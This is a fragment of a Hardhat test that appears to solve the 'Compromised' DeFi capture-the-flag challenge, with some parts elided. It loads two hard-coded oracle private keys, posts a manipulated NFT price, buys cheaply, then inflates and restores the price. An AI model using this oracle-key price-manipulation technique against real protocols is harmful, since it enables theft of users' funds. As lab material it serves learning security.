...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    let source0 = new ethers.Wallet(
      "c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );
    console.log("source0", source0.address);
    let source1 = new ethers.Wallet(
      "208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );
    console.log("source1", source1.address);
    for (let i = 0; i < 4; i++) {
      await oracle.connect(source0).postPrice("DVNFT", 1);
      await oracle.connect(source1).postPrice("DVNFT", 1);
    }
    await exchange.connect(player).buyOne({ value: 1 });

    for (let i = 0; i < 8; i++) {
      await oracle.connect(source0).postPrice("DVNFT", INITIAL_NFT_PRICE + 1n);
    ...
    for (let i = 0; i < 16; i++) {
      await oracle.connect(source0).postPrice("DVNFT", INITIAL_NFT_PRICE);
